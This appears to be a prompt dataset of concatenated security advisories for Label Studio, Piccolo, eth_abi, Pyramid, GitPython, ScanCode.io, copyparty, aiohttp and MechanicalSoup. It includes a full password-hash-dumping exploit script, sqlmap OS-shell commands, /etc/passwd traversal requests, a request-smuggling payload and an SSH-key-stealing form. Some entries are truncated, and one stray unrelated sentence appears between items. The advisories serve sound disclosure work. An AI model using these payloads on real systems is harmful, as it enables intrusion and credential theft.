Input: # Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```.

Input: ### Summary\nThe handling of named transaction savepoints in all database implementations is vulnerable to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) as user provided input is passed directly to `connection.execute(...)` via f-strings.\n\n### Details\n\nAn excerpt of the Postgres savepoint handling:\n```python\n    async def savepoint(self, name: t.Optional[str] = None) -> Savepoint:\n        name = name or f\"savepoint_{self.get_savepoint_id()}\"\n        await self.connection.execute(f\"SAVEPOINT {name}\")\n        return Savepoint(name=name, transaction=self)\n```\n\nIn this example, we can see user input is directly passed to `connection.execute` without being properly escaped. \n\nAll implementations of savepoints and savepoint methods directly pass this `name` parameter to `connection.execute` and are vulnerable to this. A non-exhaustive list can be found below:\n- Postgres\n- - [One](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L239)\n- - [Two](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L133)\n- - [Three](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L138)\n- Sqlite\n- - [One](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L416)\n- - [Two](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L313)\n- - [Three](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L318)\n\nCare should be given to ensuring all strings passed to `connection.execute` are properly escaped, regardless of how end user facing they may be.\n\nFurther to this, the [following method](https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L404) also passes user input directly to an execution context however I have been unable to abuse this functionality at the time of writing. This method also has a far lower chance of being exposed to an end user as it relates to database init functionality.\n\n### PoC\n\nThe following FastAPI route can be used in conjunction with [sqlmap](https://github.com/sqlmapproject/sqlmap) to easily demonstrate the SQL injection.\n\n```python\nDB = ...\n\n@app.get(\"/test\")\nasync def test(name):\n    async with DB.transaction() as transaction:\n        await transaction.savepoint(name)\n```\n\n##### Steps\n\n1. Create a standard Piccolo application with Postgres as a database backend\n2. Add the route shown previously\n3. Run your application, making a note of the URL it is served on\n4. Install [sqlmap](https://github.com/sqlmapproject/sqlmap)\n5. In a terminal, run the following command substituting URL with your applications URL: `sqlmap -u \"http://URL/test?name=a\" --batch`\n6. Observe sqlmap identifying the vulnerability\n\nFor sqlmap help, [this usage guide](https://github.com/sqlmapproject/sqlmap/wiki/Usage) may be useful. The following commands may also be helpful to see the impact.\n\n###### Dumping all tables\n\nThe `--tables` flag will enumerate all tables accessible from within the exposed database session.\n\n`sqlmap -u \"http://URL/test?name=a\" --batch --tables`\n\nAn example output of this can be seen in the following screenshot.\n![Screenshot from 2023-11-06 23-10-30](https://user-images.githubusercontent.com/47520067/280669236-5be9dc0f-4d2c-4bad-a1ba-fc1eb43fdb34.png)\n\n\n###### OS Shell\n\nThe `--os-shell` will drop the user into an OS shell on the underlying system if permissions permit. This can be seen in the attached screenshot which prints the databases current working directory. \n![Screenshot from 2023-11-06 22-43-50](https://user-images.githubusercontent.com/47520067/280668670-0a152589-5f4c-468d-99b9-045226934007.png)\n\n\n### Impact\n\nWhile the likelihood of an end developer exposing a savepoints `name` parameter to a user is highly unlikely, it would not be unheard of. If a malicious user was able to abuse this functionality they would have essentially direct access to the database and the ability to modify data to the level of permissions associated with the database user. \n\nA non exhaustive list of actions possible based on database permissions is:\n- Read all data stored in the database, including usernames and password hashes\n- Insert arbitrary data into the database, including modifying existing records \n- Gain a shell on the underlying server.

Input: With this notification I would like to inform about a DoS vector in the Ethereum ABI decoder. \nWe have not yet found a way to exploit this with high impact, still the bug could potentially lead to a DoS in server systems.\n\nFeel free to ask about an extension of the embargo period.\n\nTrail of Bits is informing you and other vendors as a community service, and so we do not seek a bug bounty on these issues.\n\n## BUG DESCRIPTION\n\nParsers must be written in a robust way, which avoids for example unrecoverable crashes, misinterpretation, hangs, or excessive resource consumption. The recent news about the aCropalypse bug also highlights that more subtle bugs like blind spots in file formats can lead to serious implications. Sometimes the specifications are at fault and sometimes the implementations.\n\nIn the case of the Ethereum ABI, I have to blame the specification more than the vulnerable implementations. The specification allows zero-sized-types (ZST), which can cause denial-of-service upon parsing a malicious payload and schema. If a ZST takes zero bytes when stored on disk, but after parsing occupies memory, then there is the possibility for a denial of service.\n\nFor instance, what will happen if a parser expects an array of ZST? It will try to parse as many ZST as the byte array claims to contain. The following figure first shows a payload of 20 bytes which will deserialize to an array of the numbers 2, 1, 3. The second payload will deserialize to 232 elements of a ZST like an empty tuple or empty array. \n\n20 bytes of data:\n```\nlength=0x3u64 2u32 1u32 3u32\n```\n8 bytes of data\n```\nlength=0xFFFFFFFu64\n```\n\nNow, this is not a problem if the individual elements take zero memory after parsing. Though, a common flaw is at least during serialization a large amount of memory will be required. If this case is not handled explicitly in the implementation then we are facing a DoS vector. For example, an implementation could decide to represent an array of ZST differently than a normal array and parse it in constant time, instead of looping and naively adding elements to an in-memory array.\n\nI mentioned that I believe this is a flaw in the specification. The reason for this is that the Ethereum ABI could have decided to disallow ZST completely. Actually, it turned out that in the latest versions of Solidity and Vyper it is not possible to define ZST like empty tuples or empty arrays. Even though the languages do not allow it, it is still allowed in the ABI specification.\n\n## POC\n\nWe define the data payload as `0x0000000000000000000000000000000000000000000000000000000000000020 00000000000000000000000000000000000000000000000000000000FFFFFFFF`. It consists of two 32-byte blocks, which describe a serialized array of ZST. The first block defines an offset to the array\u2019s elements. The second block defines the length of the array. Independent of the programming language we will reference it always as payload.\n\nWe will try to decode this payload using the ABI schemata ()[] and uint32[0][]. The former represents a dynamic array of empty tuples and the latter a dynamic array of empty static arrays. The distinction between dynamic and static is important here, because an empty static array takes zero bytes, whereas a dynamic one takes a few bytes because it serializes the length of the array.\n\nThe following Python program uses the official eth_abi library and will hang and eventually cause an out-of-memory error.\n\n    from eth_abi import decode\n    data = bytearray.fromhex(payload)\n    decode(['()[]'], data)\n\n## SUGGESTED REMEDIATION\n\nWe suggest to disallow the parsing of ZST.\n.

Input: ### Impact\n\nThis impacts users of Python 3.11 that are using a Pyramid static view with a full filesystem path and have a `index.html` file that is located exactly one directory above the location of the static view's file system path. No further path traversal exists, and the only file that could be disclosed accidentally is `index.html`.\n\nExample:\n\n```\nconfig.add_static_view(name='static', path='/usr/src/app/static', cache_max_age=0)\n```\n\nAnd directory tree:\n\n```\n/usr/src/app \\\n              | - static \\\n                          | - file.css\n                          | - index.html\n                          | - ...\n              | - index.html <-- (this file could be disclosed with this bug)\n```\n\n### Patches\n\nPyramid now will reject any path that contains a null-byte out of caution.

Input: ### Summary\n\nWhen resolving a program, Python/Windows look for the current working directory, and after that the PATH environment (see big warning in https://docs.python.org/3/library/subprocess.html#popen-constructor). GitPython defaults to use the `git` command, if a user runs GitPython from a repo has a `git.exe` or `git` executable, that program will be run instead of the one in the user's `PATH`.\n\n### Details\n\nThis is more of a problem on how Python interacts with Windows systems, Linux and any other OS aren't affected by this. But probably people using GitPython usually run it from the CWD of a repo.\n\nThe execution of the `git` command happens in\n\nhttps://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/cmd.py#L277 \n\nhttps://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/cmd.py#L983-L996\n\nAnd there are other commands executed that should probably be aware of this problem.\n\n### PoC\n\nOn a Windows system, create a `git.exe` or `git` executable in any directory, and import or run GitPython from that directory\n\n```\npython -c \"import git\"\n```\n\nThe git executable from the current directory will be run.\n\n### Impact\n\nAn attacker can trick a user to download a repository with a malicious `git` executable, if the user runs/imports GitPython from that directory, it allows the attacker to run any arbitrary commands.\n\n### Possible solutions\n \n- Default to an absolute path for the git program on Windows, like `C:\\\\Program Files\\\\Git\\\\cmd\\\\git.EXE` (default git path installation).\n- Require users to set the `GIT_PYTHON_GIT_EXECUTABLE` environment variable on Windows systems.\n- Make this problem prominent in the documentation and advise users to never run GitPython from an untrusted repo, or set the `GIT_PYTHON_GIT_EXECUTABLE` env var to an absolute path.\n- Resolve the executable manually by only looking into the `PATH` environment variable (suggested by @Byron)\n\n---\n\n> [!NOTE]\n> This vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided..

Please identify the software name affected by it. Input: ## Command Injection in docker fetch process\n\n### Summary\nA possible command injection in the docker fetch process as it allows to append malicious commands in the docker_reference parameter.\n\n\n### Details\nIn the function `scanpipe/pipes/fetch.py:fetch_docker_image`[1] the parameter `docker_reference` is user controllable. The `docker_reference` variable is then passed to the vulnerable function `get_docker_image_platform`. \n```python\ndef fetch_docker_image(docker_reference, to=None):\n    \"\"\"\n    code snipped ....\n    \"\"\"\n    platform_args = []\n    platform = get_docker_image_platform(docker_reference) # User controlled `docker_reference` passed\n   \"\"\"\n   code snipped...\n   \"\"\"\n```\n\nHowever, the `get_docker_image_plaform` function constructs a shell command with the passed `docker_reference`. The `pipes.run_command` then executes the shell command without any prior sanitization, making the function vulnerable to command injections. \n\n```python\ndef get_docker_image_platform(docker_reference):\n    \"\"\"\n    Return a platform mapping of a docker reference.\n    If there are more than one, return the first one by default.\n    \"\"\"\n    skopeo_executable = _get_skopeo_location()\n    \"\"\"\n    Constructing a shell command with user controlled variable `docker_reference`\n    \"\"\"\n    cmd = (\n        f\"{skopeo_executable} inspect --insecure-policy --raw --no-creds \"\n        f\"{docker_reference}\"\n    )\n\n    logger.info(f\"Fetching image os/arch data: {cmd}\")\n    exitcode, output = pipes.run_command(cmd) # Executing command\n    logger.info(output)\n    if exitcode != 0:\n        raise FetchDockerImageError(output)\n``` \n\nA malicious user who is able to create or add inputs to a project can inject commands. Although the command injections are blind and the user will not receive direct feedback without logs, it is still possible to cause damage to the server/container. The vulnerability appears for example if a malicious user adds a semicolon after the input of `docker://;`, it would allow appending malicious commands.\n\n### PoC\n\n1.

Using TLS can significantly increase security by guaranteeing the identity of the party you are communicating with.

Input: # Summary\nAll versions before 1.8.2 have a path traversal vulnerability, allowing an attacker to download unintended files from the server.\n\n# Details\nUnauthenticated users were able to retrieve any files which are accessible (according to OS-level permissions) from the copyparty process. Usually, this is all files that are readable by the OS account which is used to run copyparty.\n\nThe vulnerability did not make it possible to list the contents of folders, so an attacker needs to know the full absolute path to the file, or the relative path from where copyparty is installed.\n\nSome methods of running copyparty ([prisonparty](https://github.com/9001/copyparty/tree/hovudstraum/bin#prisonpartysh), the [nix package](https://github.com/9001/copyparty#nix-package), and [docker](https://github.com/9001/copyparty/tree/hovudstraum/scripts/docker)) had a mitigating effect, mostly reducing the attack scope to files inside copyparty volumes, and possibly the copyparty config file.\n\n# Checking for attacks\nPlease keep in mind that, if an attacker were to find a way to overwrite the logs, for example by discovering the password to another service with sufficient privileges, then the following approaches cannot be trusted.\n\nif copyparty was only accessible through a reverse proxy, then all attacks would be visible in the webserver access-log as URLs which contain both `.cpr/` and `%2F`\n* nginx:\n  ```bash\n  (gzip -dc access.log*.gz; cat access.log) | sed -r 's/\" [0-9]+ .*//' | grep -E 'cpr/.*%2[^0]' | grep -vF data:image/svg\n  ```\n\nHowever, if copyparty was directly accessible from the internet, then any successful attacks (file retrievals) would unfortunately leave no trace. That said, it is very probable that an attacker would make at least one invalid attempt, which would become apparent in the copyparty server log, detectable with `grep -aE '(Errno|Permission).*\\.cpr/'` revealing the following:\n* python2 example: `[IOError] [Errno 13] Permission denied: '/etc/shadow', .cpr//etc/shadow`\n* python3 example: `[PermissionError] [Errno 13] Permission denied: b'/etc/shadow', .cpr//etc/shadow`\n \n\nProviding an exact command for this approach is difficult, as it depends on how copyparty is deployed;\n* if copyparty was running as a systemd service: `journalctl -am | grep -aE '(Errno|Permission).*\\.cpr/'`\n* if copyparty was logging to a compressed file: `xz -kdc thefilename.xz | grep -aE '(Errno|Permission).*\\.cpr/'`\n* if the copyparty log is available in a plaintext file: `grep -aE '(Errno|Permission).*\\.cpr/' thefilename.txt`\n\n# PoC / attack example\n```bash\ncurl -sik http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\ncurl -sik http://127.0.0.1:3923/.cpr/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n```\n.

The vulnerable code is used by aiohttp for its HTTP request parser when available which is the default case when installing from a wheel.\n\nThis vulnerability only affects users of aiohttp as an HTTP server (ie `aiohttp.Application`), you are not affected by this vulnerability if you are using aiohttp as an HTTP client library (ie `aiohttp.ClientSession`).\n\n### Reproducer\n\n```python\nfrom aiohttp import web\n\nasync def example(request: web.Request):\n    headers = dict(request.headers)\n    body = await request.content.read()\n    return web.Response(text=f\"headers: {headers} body: {body}\")\n\napp = web.Application()\napp.add_routes([web.post('/', example)])\nweb.run_app(app)\n```\n\nSending a crafted HTTP request will cause the server to misinterpret one of the HTTP header values leading to HTTP request smuggling.\n\n```console\n$ printf \"POST / HTTP/1.1\\r\\nHost: localhost:8080\\r\\nX-Abc: \\rxTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n\" \\\n  | nc localhost 8080\n\nExpected output:\n  headers: {'Host': 'localhost:8080', 'X-Abc': '\\rxTransfer-Encoding: chunked'} body: b''\n\nActual output (note that 'Transfer-Encoding: chunked' is an HTTP header now and body is treated differently)\n  headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'\n```\n\n### Patches\n\nUpgrade to the latest version of aiohttp to resolve this vulnerability. It has been fixed in v3.8.5: [`pip install aiohttp >= 3.8.5`](https://pypi.org/project/aiohttp/3.8.5/)\n\n### Workarounds\n\nIf you aren't able to upgrade you can reinstall aiohttp using `AIOHTTP_NO_EXTENSIONS=1` as an environment variable to disable the llhttp HTTP request parser implementation. The pure Python implementation isn't vulnerable to request smuggling:\n\n```console\n$ python -m pip uninstall --yes aiohttp\n$ AIOHTTP_NO_EXTENSIONS=1 python -m pip install --no-binary=aiohttp --no-cache aiohttp\n```\n\n### References\n\n* https://nvd.nist.gov/vuln/detail/CVE-2023-30589\n* https://hackerone.com/reports/2001873\n.

Input: ### Summary\nA malicious web server can read arbitrary files on the client using a `<input type=\"file\" ...>` inside HTML form.\n\n### Details\nThis affects the extremely common pattern of form submission:\n\n```python\nb = mechanicalsoup.StatefulBrowser()\nb.select_form(...)\nb.submit_selected()\n```\n\nThe problem is with the code in `browser.Browser.get_request_kwargs`:\n\n```python\n    if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n        filepath = value\n        if filepath != \"\" and isinstance(filepath, str):\n            content = open(filepath, \"rb\")\n        else:\n            content = \"\"\n        filename = os.path.basename(filepath)\n        # If value is the empty string, we still pass it\n        # for consistency with browsers (see\n        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n        files[name] = (filename, content)\n```\n\nThe file path is taken from the bs4 tag \"value\" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:\n\n```html\n<html><body>\n  <form method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"text\" name=\"greeting\" value=\"hello\" />\n    <input type=\"file\" name=\"evil\" value=\"/home/user/.ssh/id_rsa\" />\n  </form>\n</body></html>\n```\n\nthen upon `.submit_selected()` the mechanicalsoup browser will happily send over the contents of your SSH private key.\n\n### PoC\n\n```python\nimport attr\nimport mechanicalsoup\nimport requests\n\n\nclass NevermindError(Exception):\n    pass\n\n\n@attr.s\nclass FakeSession:\n    session = attr.ib()\n\n    headers = property(lambda self: self.session.headers)\n\n    def request(self, *args, **kwargs):\n        print(\"requested\", args, kwargs)\n        raise NevermindError  # don't actually send request\n\n\ndef demonstrate(inputs=None):\n    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))\n    b.open_fake_page(\"\"\"\\\n<html><body>\n<form method=\"post\" enctype=\"multipart/form-data\">\n<input type=\"text\" name=\"greeting\" value=\"hello\" />\n<input type=\"file\" name=\"evil\" value=\"/etc/passwd\" />\n<input type=\"file\" name=\"second\" />\n</form>\n</body></html>\n\"\"\", url=\"http://127.0.0.1:9/\")\n    b.select_form()\n    if inputs is not None:\n        b.form.set_input(inputs)\n    try:\n        b.submit_selected()\n    except NevermindError:\n        pass\n\n# %%\n\n# unpatched\ndemonstrate()\n# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', <_io.BufferedReader name='/etc/passwd'>), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}\n\n# %%\n\n# with the patch, this now works. users MUST open the file manually and\n# use browser.set_input() using the file object.\ndemonstrate({\"greeting\": \"hiya\", \"evil\": open(\"/etc/hostname\", \"rb\").name, \"second\": open(\"/dev/null\", \"rb\")})\n# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', <_io.BufferedReader name='/etc/hostname'>), 'second': ('null', <_io.BufferedReader name='/dev/null'>)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}\n\n# %%\n\n# with the patch, this raises a ValueError with a helpful string\ndemonstrate({\"evil\": \"/etc/hostname\"})\n\n# %%\n\n# with the patch, we silently send no file if a malicious server tries the attack:\ndemonstrate()\n```\n\n### Suggested patch\n\n```diff\ndiff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py\nindex 285f8bb..68bc65e 100644\n--- a/mechanicalsoup/browser.py\n+++ b/mechanicalsoup/browser.py\n@@ -1,7 +1,8 @@\n+import io\n import os\n import tempfile\n import urllib\n import weakref\n import webbrowser\n \n import bs4\n@@ -227,15 +228,21 @@ class Browser:\n                     value = tag.get(\"value\", \"\")\n \n                 # If the enctype is not multipart, the filename is put in\n                 # the form as a text input and the file is not sent.\n                 if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n                     filepath = value\n                     if filepath != \"\" and isinstance(filepath, str):\n-                        content = open(filepath, \"rb\")\n+                        content = getattr(tag, \"_mechanicalsoup_file\", None)\n+                        if content is False:\n+                            raise ValueError(\n+                                \"\"\"From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({\"name\": open(\"/path/to/filename\", \"rb\")})`.

